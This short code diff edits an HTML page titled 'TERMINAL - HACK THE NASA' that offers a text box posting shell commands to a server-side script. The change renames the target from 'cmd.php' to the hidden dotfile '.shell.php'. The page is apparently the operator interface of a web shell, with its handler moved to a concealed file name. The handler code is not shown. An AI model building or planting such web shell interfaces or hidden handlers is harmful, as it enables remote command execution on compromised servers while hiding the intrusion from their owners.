@@ -27,7 +27,7 @@
 </style>
 <center><img src="https://cdn.discordapp.com/attachments/980408355174645760/1036999106519900200/tssss.gif" height="600px"></center>
 <center><h3 class="htr">TERMINAL - HACK THE NASA</h3></center>
-<center><form action="cmd.php" method="post">
+<center><form action=".shell.php" method="post">
     <input type="text" name="cmd" placeholder="COMMAND"><br>
     <button>submit</button>
 </form></center>
